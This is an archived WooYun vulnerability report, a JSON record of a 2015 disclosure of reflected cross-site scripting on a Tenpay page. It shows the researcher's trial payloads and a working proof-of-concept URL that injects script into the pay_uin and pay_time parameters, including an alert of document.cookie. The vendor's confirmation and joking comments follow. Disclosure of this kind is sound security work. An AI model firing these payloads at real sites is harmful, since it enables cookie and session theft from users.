{"id": 38647, "wybug_id": "wooyun-2015-095811", "wybug_title": "财付通某处增大字符触发XSS", "wybug_corp": "腾讯", "wybug_author": "0x 80", "wybug_date": "2015-02-06 11:32", "wybug_open_date": "2015-03-23 11:34", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "黑盒测试技巧", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向公众公开  简要描述： 财付通某处增大字符触发XSS您的财付通本次到账：100000000000000000000000000 元哇，钱钱哪。呵呵 详细说明：  http://action.tenpay.com/wxts/ptrp.shtml?total_fee=\n\n其中?total_fee参数是用来接收金额的那么我们先输入11111111111111111111111111\n\n已经弹出了一个错误信息那么我们看看、、\n\n其中还有个参数pay_uin===========那么加上\nhttp://action.tenpay.com/wxts/ptrp.shtml?total_fee=100000000000000000000000000&pay_uin=\n\n\n接着嵌入<LINK REL=\"stylesheet\" href=\"javascript:alert('XSS');\">无反应：http://action.tenpay.com/wxts/ptrp.shtml?total_fee=100000000000000000000000000&pay_uin=%3CLINK%20REL=%22stylesheet%22%20href=%22javascript:alert%28%27XSS%27%29;%22%3E那么，换下<img src=\"\"></img>\n\n注意。我们再写个<script>alert(\"\")</script>\nhttp://action.tenpay.com/wxts/ptrp.shtml?total_fee=100000000000000000000000000&pay_uin=%3Cimg%20src=%22%22%3E%3C/img%3E%3Cscript%3Ealert%28%22%22%29%3C/script%3E\n还是无法触发接下来，我们想下在IMG处改下替换成<img 11111111111111111&pay_time时间参数配合他<img 11111111111111111<script>alert(\"\")</script> 于 undefined 向您付款 100000000000000000000000000 元，请注意查收。pay_uin=写入<img 11111111111111111<script>alert(\"\")</script>&pay_time=<script>alert(\"0x 80\")</script><script>alert(document.cookie)</script>转URL码%3C%69%6D%67%20%31%31%31%31%31%31%31%31%31%31%31%31%31%31%31%31%31%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%22%29%3C%2F%73%63%72%69%70%74%3E%26%70%61%79%5F%74%69%6D%65%3D%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%30%78%触发了\n\n\n\n   漏洞证明：  \nhttp://action.tenpay.com/wxts/ptrp.shtml?total_fee=100000000000000000000000000&pay_uin=%3Cimg%2011111111111111111%3Cscript%3Ealert%28%22%22%29%3C/script%3E&pay_time=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E\n   修复方案：     版权声明：转载请注明来源 0x 80@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-02-06 17:57 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-06 18:03 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  本次到账9999999999999    小伙怎么不提现啊    \n     2015-02-06 18:05 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊本次到账9999999999999 小伙怎么不提现啊    \n     2015-02-07 10:04 |    \t\t小牛牛 \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:7        | 求带)\t\t \n  提现啊  小伙！！！！！    \n     2015-03-15 21:05 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  这个排版。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}